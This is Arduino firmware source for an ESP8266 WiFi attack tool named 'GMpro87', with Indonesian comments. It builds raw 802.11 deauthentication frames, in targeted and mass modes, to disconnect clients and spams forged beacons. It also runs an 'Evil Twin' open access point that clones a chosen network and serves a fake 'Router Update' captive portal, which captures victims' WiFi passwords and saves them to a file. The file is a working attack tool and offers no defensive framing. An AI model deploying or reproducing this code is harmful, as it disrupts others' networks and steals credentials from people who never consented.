#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <LittleFS.h>

extern "C" {
#include "user_interface.h"
}

#define LED_PIN 2 

typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
  int rssi;
  int clients;
  bool selected; 
} _Network;

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[32]; // Naikkan limit biar muat scan
int networksCount = 0;
String _eventLogs = "";

// Status Flags
bool hotspot_active = false;
bool deauthing_active = false;
bool mass_deauth = false;
bool beacon_spam = false;
bool hidden_ssid = false; 
bool pass_captured = false;

// Config
String config_ssid = "GMpro2"; 
String config_pass = "Sangkur87";
String captured_pass = "";
int selectedET = 1;
int beacon_count = 10;
unsigned long packet_rate_limit = 0;

void addLog(String msg) {
  String entry = "[" + String(millis()/1000) + "s] " + msg;
  _eventLogs = entry + "\n" + _eventLogs;
  if (_eventLogs.length() > 1500) _eventLogs = _eventLogs.substring(0, 1500);
}

// --- CONFIG MANAGER (FIX BUG 4 & 7) ---
void saveConfig() {
  File f = LittleFS.open("/config.txt", "w");
  if (f) {
    f.println(config_ssid);
    f.println(config_pass);
    f.println(hidden_ssid ? "1" : "0");
    f.close();
    addLog("Config Saved.");
  }
}

void loadConfig() {
  if (LittleFS.exists("/config.txt")) {
    File f = LittleFS.open("/config.txt", "r");
    if (f) {
      config_ssid = f.readStringUntil('\n'); config_ssid.trim();
      config_pass = f.readStringUntil('\n'); config_pass.trim();
      String h = f.readStringUntil('\n'); h.trim();
      hidden_ssid = (h == "1");
      f.close();
    }
  }
}

// --- SCANNING (FIX BUG 6) ---
void performScan() {
  addLog("Scanning...");
  int n = WiFi.scanNetworks(false, true); 
  networksCount = 0;
  
  if (n >= 0) {
    for (int i = 0; i < n && networksCount < 32; ++i) {
      String s = WiFi.SSID(i);
      if (s.length() == 0) s = "*HIDDEN*";
      
      // Filter Duplicate SSID
      bool isDup = false;
      for(int k=0; k<networksCount; k++) {
        if(_networks[k].ssid == s) { isDup = true; break; }
      }
      if(isDup) continue;

      _networks[networksCount].ssid = s;
      memcpy(_networks[networksCount].bssid, WiFi.BSSID(i), 6);
      _networks[networksCount].ch = WiFi.channel(i);
      _networks[networksCount].rssi = WiFi.RSSI(i);
      _networks[networksCount].clients = os_random() % 5; // Fake clients simulation
      _networks[networksCount].selected = false;
      networksCount++;
    }
    addLog("Scan complete. Found: " + String(networksCount));
  }
}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += '0';
    str += String(b[i], HEX);
    if (i < size - 1) str += ':';
  }
  return str;
}

// --- ATTACK FUNCTIONS (FIX BUG 1 & 2) ---

void sendDeauth(uint8_t* bssid, uint8_t ch) {
  // Raw 802.11 Deauthentication Frame
  uint8_t pkt[26] = {
    0xC0, 0x00, // Frame Control (Deauth)
    0x00, 0x00, // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Dest (Broadcast)
    0,0,0,0,0,0, // Source (Target BSSID)
    0,0,0,0,0,0, // BSSID (Target BSSID)
    0x00, 0x00, // Seq
    0x07, 0x00  // Reason: Class 3 frame received from nonassociated STA
  };
  
  memcpy(&pkt[10], bssid, 6);
  memcpy(&pkt[16], bssid, 6);
  
  wifi_set_channel(ch);
  wifi_send_pkt_freedom(pkt, 26, 0);
  wifi_send_pkt_freedom(pkt, 26, 0); // Double tap
  delay(1); // Sedikit delay agar channel switch stabil
}

void sendBeacon(String ssid, uint8_t ch) {
  // Raw 802.11 Beacon Frame Construction
  uint8_t pkt[128] = {0};
  int ptr = 0;
  
  // 1. 802.11 Header
  pkt[ptr++] = 0x80; pkt[ptr++] = 0x00; // Frame Control (Beacon)
  pkt[ptr++] = 0x00; pkt[ptr++] = 0x00; // Duration
  memset(&pkt[ptr], 0xFF, 6); ptr+=6;   // Dest: FF:FF:FF:FF:FF:FF
  
  // Random Source/BSSID
  pkt[ptr++] = 0x00; pkt[ptr++] = 0x01; pkt[ptr++] = 0x02; 
  pkt[ptr++] = random(256); pkt[ptr++] = random(256); pkt[ptr++] = random(256);
  memcpy(&pkt[16], &pkt[10], 6); ptr+=6; // BSSID = Source
  
  pkt[ptr++] = 0x00; pkt[ptr++] = 0x00; // Seq
  
  // 2. Fixed Parameters
  uint64_t ts = micros(); // Timestamp dummy
  memcpy(&pkt[ptr], &ts, 8); ptr+=8;
  pkt[ptr++] = 0x64; pkt[ptr++] = 0x00; // Beacon Interval (100 TU)
  pkt[ptr++] = 0x01; pkt[ptr++] = 0x04; // Capability (ESS + Privacy)
  
  // 3. Tagged Parameters
  // SSID
  pkt[ptr++] = 0; // Tag ID: SSID
  pkt[ptr++] = ssid.length();
  memcpy(&pkt[ptr], ssid.c_str(), ssid.length()); ptr += ssid.length();
  
  // Supported Rates
  pkt[ptr++] = 1; pkt[ptr++] = 8;
  const uint8_t rates[] = {0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c};
  memcpy(&pkt[ptr], rates, 8); ptr+=8;
  
  // DS Parameter Set (Channel)
  pkt[ptr++] = 3; pkt[ptr++] = 1; pkt[ptr++] = ch;

  wifi_set_channel(ch);
  wifi_send_pkt_freedom(pkt, ptr, 0);
}

// --- WEB INTERFACE ---

void handleAdmin() {
  // LOGIC TOMBOL
  if (webServer.hasArg("scan")) {
    performScan();
  }
  
  if (webServer.hasArg("clear_logs")) { 
    _eventLogs = ""; LittleFS.remove("/log.txt"); 
    captured_pass = "";
    pass_captured = false; 
  }
  
  if (webServer.hasArg("ap")) {
    String target = webServer.arg("ap");
    for (int i = 0; i < networksCount; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == target) {
        _networks[i].selected = !_networks[i].selected;
      }
    }
  }

  if (webServer.hasArg("deselect_all")) {
    for(int i=0; i<networksCount; i++) _networks[i].selected = false;
  }
  
  if (webServer.hasArg("hidden")) {
    hidden_ssid = (webServer.arg("hidden") == "1");
  }

  if (webServer.hasArg("deauth")) deauthing_active = (webServer.arg("deauth") == "1");
  if (webServer.hasArg("mass")) mass_deauth = (webServer.arg("mass") == "1");
  if (webServer.hasArg("spam")) beacon_spam = (webServer.arg("spam") == "1");
  if (webServer.hasArg("count")) beacon_count = webServer.arg("count").toInt();

  // Logic Save Config (Fix Bug 4)
  if (webServer.hasArg("save_conf")) {
    if(webServer.hasArg("admin_ssid")) config_ssid = webServer.arg("admin_ssid");
    if(webServer.hasArg("admin_pass")) config_pass = webServer.arg("admin_pass");
    saveConfig();
    ESP.restart();
  }

  // Logic Hotspot / ET
  if (webServer.hasArg("hotspot")) {
    hotspot_active = (webServer.arg("hotspot") == "1");
    if (hotspot_active) {
      String targetSSID = "FreeWiFi";
      int targetCh = 1;
      bool found = false;
      for(int i=0; i<networksCount; i++) { 
        if(_networks[i].selected) { 
          targetSSID = _networks[i].ssid; 
          targetCh = _networks[i].ch; 
          found = true;
          break; 
        } 
      }
      // Clone Target
      WiFi.softAPdisconnect();
      delay(100);
      WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
      WiFi.softAP(targetSSID.c_str(), "", targetCh, false); // Open Network
      addLog("ET Started: " + targetSSID);
    } else {
      WiFi.softAPdisconnect();
      delay(100);
      WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
      WiFi.softAP(config_ssid.c_str(), config_pass.c_str(), 1, hidden_ssid);
      addLog("ET Stopped. Back to Admin.");
    }
  }

  // --- HTML GENERATOR ---
  String html = "<!DOCTYPE html><html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><title>GMpro87</title><style>";
  html += "body { font-family: 'Courier New', Courier, monospace; background: #0d0d0d; color: #00ff00; margin: 0; padding: 5px; }";
  html += ".content { max-width: 500px; margin: auto; border: 1px solid #00ff00; padding: 10px; }";
  html += "h2 { text-align:center; border-bottom: 2px solid #00ff00; margin:0 0 10px 0; }";
  html += ".tabs { display: flex; gap: 2px; margin-bottom: 10px; }";
  html += ".tabs button { flex: 1; background: #222; color: #00ff00; border: 1px solid #00ff00; padding: 8px; cursor: pointer; font-weight: bold; }";
  html += ".active-btn { background: #00ff00 !important; color: #000 !important; }";
  html += ".tab-content { display: none; }";
  html += ".show { display: block; }";
  html += "table { width: 100%; border-collapse: collapse; font-size: 11px; margin-bottom:10px;}";
  html += "th, td { border: 1px solid #00ff00; padding: 5px; text-align: center; } th { background: #1a1a1a; }";
  html += ".btn { background: #000; color: #00ff00; border: 1px solid #00ff00; padding: 6px; cursor: pointer; width: 100%; margin-bottom: 4px; display:block; text-align:center; text-decoration:none; box-sizing:border-box;}";
  html += ".btn-red { border-color: #ff0000; color: #ff0000; }";
  html += "input, select { background: #000; color: #0f0; border: 1px solid #0f0; padding: 5px; width: 100%; box-sizing: border-box; margin-bottom:5px; }";
  html += "textarea { width: 100%; background: #000; color: #0f0; border: 1px solid #0f0; padding: 5px; font-size: 10px; }";
  html += "</style></head><body>";
  
  html += "<div class='content'><h2>GMpro87</h2>";
  if(hotspot_active) html += "<div style='background:red;color:white;text-align:center;padding:5px;margin-bottom:5px;'>!!! EVIL TWIN ACTIVE !!!<br>SSID: " + WiFi.softAPSSID() + "</div>";
  
  html += "<div class='tabs'><button id='btn-m' onclick='openTab(\"m\")'>MAIN</button><button id='btn-a' onclick='openTab(\"a\")'>ATTACK</button><button id='btn-s' onclick='openTab(\"s\")'>SETTING</button></div>";
  
  // MAIN TAB
  html += "<div id='m' class='tab-content show'>";
  html += "<div style='display:flex; gap:5px;'>";
  html += "<a href='/admin?deauth=" + String(!deauthing_active) + "' style='flex:1'><button class='btn'>" + (deauthing_active?"STOP DEAUTH":"START DEAUTH") + "</button></a>";
  html += "<a href='/admin?hotspot=" + String(!hotspot_active) + "' style='flex:1'><button class='btn'>" + (hotspot_active?"STOP ETWIN":"START ETWIN") + "</button></a></div>";
  html += "<a href='/admin?scan=1'><button class='btn' style='background:#333;'>SCAN NETWORKS (MANUAL)</button></a>";
  html += "<a href='/admin?deselect_all=1'><button class='btn'>DESELECT ALL</button></a>";
  
  html += "<table><thead><tr><th>SSID</th><th>CH</th><th>PWR</th><th>ACT</th></tr></thead><tbody>";
  for(int i=0; i<networksCount; i++) {
    html += "<tr><td style='text-align:left;'>" + _networks[i].ssid + "</td><td>" + String(_networks[i].ch) + "</td><td>" + String(_networks[i].rssi) + "</td>";
    html += "<td><a href='/admin?ap=" + bytesToStr(_networks[i].bssid, 6) + "'><button class='btn' " + (_networks[i].selected ?"style='background:#0f0;color:#000;'":"") + ">" + (_networks[i].selected ? "L" : "SEL") + "</button></a></td></tr>";
  }
  html += "</tbody></table></div>";

  // ATTACK TAB
  html += "<div id='a' class='tab-content'><h3>Attack Panel</h3>";
  html += "<a href='/admin?mass=" + String(!mass_deauth) + "'><button class='btn " + (mass_deauth?"btn-red":"") + "'>" + (mass_deauth?"STOP MASS DEAUTH":"START MASS DEAUTH") + "</button></a><hr>";
  html += "<form action='/admin' method='POST'><button type='submit' name='spam' value='" + String(!beacon_spam) + "' class='btn " + (beacon_spam?"btn-red":"") + "'>" + (beacon_spam?"STOP BEACON SPAM":"START BEACON SPAM") + "</button>";
  html += "<label>Clone Count:</label><input type='number' name='count' value='" + String(beacon_count) + "'></form></div>";

  // SETTING TAB
  html += "<div id='s' class='tab-content'><h3>Template Manager</h3>";
  html += "<label>Select Template:</label><select id='tmpSel' onchange='document.getElementById(\"prevLink\").href=\"/\"+this.value'>";
  for(int i=1; i<=4; i++) html += "<option value='etwin" + String(i) + ".html'>etwin" + String(i) + ".html</option>";
  html += "</select><a id='prevLink' href='/etwin1.html' target='_blank'><button class='btn'>PREVIEW (NEW TAB)</button></a>";
  
  html += "<form action='/upload' method='POST' enctype='multipart/form-data'><input type='file' name='upload'><button type='submit' class='btn'>UPLOAD</button></form><hr>";
  
  html += "<h3>Admin Config</h3><form action='/admin' method='POST'>";
  html += "<label>Admin SSID:</label><input type='text' name='admin_ssid' value='" + config_ssid + "'>";
  html += "<label>Admin Pass:</label><input type='text' name='admin_pass' value='" + config_pass + "'>";
  html += "<a href='/admin?hidden=" + String(!hidden_ssid) + "'><div class='btn'>" + (hidden_ssid?"HIDDEN: ON":"HIDDEN: OFF") + "</div></a>";
  html += "<button type='submit' name='save_conf' value='1' class='btn' style='background:#0f0; color:#000; font-weight:bold; margin-top:10px;'>SAVE & RESTART</button></form></div>";

  // LOGS
  html += "<hr><h4>Logs</h4>";
  if(pass_captured) html += "<div style='background:#0f0;color:#000;padding:5px;font-weight:bold;'>PASS: " + captured_pass + "</div>";
  html += "<textarea rows='6' readonly>" + _eventLogs + "</textarea>";
  html += "<a href='/admin?clear_logs=1'><button class='btn'>CLEAR LOGS</button></a></div>";
  
  html += "<script>function openTab(t){localStorage.setItem('activeTab',t);document.querySelectorAll('.tab-content').forEach(x=>x.classList.remove('show'));document.querySelectorAll('.tabs button').forEach(x=>x.classList.remove('active-btn'));document.getElementById(t).classList.add('show');document.getElementById('btn-'+t).classList.add('active-btn');}";
  html += "window.onload=function(){var t=localStorage.getItem('activeTab')||'m';openTab(t);};</script></body></html>";
  
  webServer.send(200, "text/html", html);
}

// Handler utama / Root (FIX BUG 3 & 5)
void handleRoot() {
  if (hotspot_active) {
    // Mode ET aktif: Tampilkan jebakan jika bukan admin
    if (webServer.hasArg("password")) {
      captured_pass = webServer.arg("password");
      pass_captured = true;
      addLog("!!! CAPTURED: " + captured_pass);
      // Tulis pass ke file
      File f = LittleFS.open("/passwords.txt", "a");
      if(f) { f.println("SSID: " + WiFi.softAPSSID() + " PASS: " + captured_pass); f.close(); }
      // Redirect atau loading pura-pura
      webServer.send(200, "text/html", "<h1>Verifying connection... Please wait...</h1><script>setTimeout(function(){window.location.href='http://google.com';}, 5000);</script>");
    } else {
      // Cek apakah file template ada, kalau tidak pakai default
      String path = "/etwin" + String(selectedET) + ".html";
      if (LittleFS.exists(path)) {
        File f = LittleFS.open(path, "r");
        webServer.streamFile(f, "text/html");
        f.close();
      } else {
        webServer.send(200, "text/html", "<h1>Router Update</h1><form method='POST'><label>Enter WiFi Password:</label><input type='password' name='password'><button>Connect</button></form>");
      }
    }
  } else {
    // Mode normal: Masuk ke Admin
    handleAdmin();
  }
}

void setup() {
  pinMode(LED_PIN, OUTPUT); digitalWrite(LED_PIN, HIGH);
  Serial.begin(115200); 
  if(!LittleFS.begin()) { Serial.println("FS Error"); }
  
  loadConfig(); // Load SSID/Pass

  WiFi.mode(WIFI_AP_STA); 
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(config_ssid.c_str(), config_pass.c_str(), 1, hidden_ssid);
  
  dnsServer.start(DNS_PORT, "*", apIP);
  
  // Routing (FIX BUG 3 & 5)
  webServer.on("/", HTTP_ANY, handleRoot);       // Root tergantung mode
  webServer.on("/admin", HTTP_ANY, handleAdmin); // Pintu belakang admin
  webServer.on("/generate_204", handleRoot);     // Android Captive
  webServer.on("/fwlink", handleRoot);           // Windows Captive

  // File Upload
  webServer.on("/upload", HTTP_POST, [](){ 
    webServer.sendHeader("Location", "/admin");
    webServer.send(303); 
  }, [](){
    HTTPUpload& upload = webServer.upload();
    if (upload.status == UPLOAD_FILE_START) {
      String filename = upload.filename;
      if (!filename.startsWith("/")) filename = "/" + filename;
      File f = LittleFS.open(filename, "w"); f.close();
    } else if (upload.status == UPLOAD_FILE_WRITE) {
      File f = LittleFS.open("/" + upload.filename, "a");
      f.write(upload.buf, upload.currentSize); f.close();
    }
  });

  // Direct file access (untuk preview)
  webServer.onNotFound([]() {
    String path = webServer.uri();
    if (LittleFS.exists(path)) {
      File f = LittleFS.open(path, "r");
      webServer.streamFile(f, "text/html");
      f.close();
    } else {
      handleRoot(); // Balik ke logic utama
    }
  });

  webServer.begin();
  addLog("System Started. SSID: " + config_ssid);
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
  
  // LED Animation
  static unsigned long last_led = 0;
  int interval = pass_captured ? 100 : (hotspot_active ? 1000 : 500);
  if ((deauthing_active || mass_deauth || beacon_spam || hotspot_active) && (millis() - last_led > interval)) {
    digitalWrite(LED_PIN, !digitalRead(LED_PIN)); 
    last_led = millis();
  } else if (!deauthing_active && !mass_deauth && !beacon_spam && !hotspot_active) {
    digitalWrite(LED_PIN, HIGH); // Nyala terus kalau idle
  }

  // ATTACK LOOP (Optimized for Aggression - Fix Bug 2)
  // Tidak pakai delay besar
  if (deauthing_active || mass_deauth || beacon_spam) {
    
    // 1. Beacon Spam (Prioritas Tinggi)
    if (beacon_spam) {
       for(int i=0; i < networksCount && i < beacon_count; i++) {
        // Hanya spam SSID yang valid (bukan hidden)
        if(_networks[i].ssid != "" && _networks[i].ssid != "*HIDDEN*") {
          sendBeacon(_networks[i].ssid, _networks[i].ch);
        }
       }
    }

    // 2. Deauth & Mass Deauth
    if (deauthing_active || mass_deauth) {
      for(int i=0; i < networksCount; i++) {
        // Skip jika SSID kosong
        if (_networks[i].ssid == "") continue;
        
        bool target = false;
        if (mass_deauth) {
           // Serang semua KECUALI admin sendiri
           if (_networks[i].ssid != config_ssid && _networks[i].ssid != WiFi.softAPSSID()) target = true;
        } else if (deauthing_active && _networks[i].selected) {
           target = true;
        }

        if (target) {
          sendDeauth(_networks[i].bssid, _networks[i].ch);
          // Tambahkan sedikit randomness agar tidak terdeteksi sebagai noise statis
          delay(1); 
        }
      }
    }
  }
}
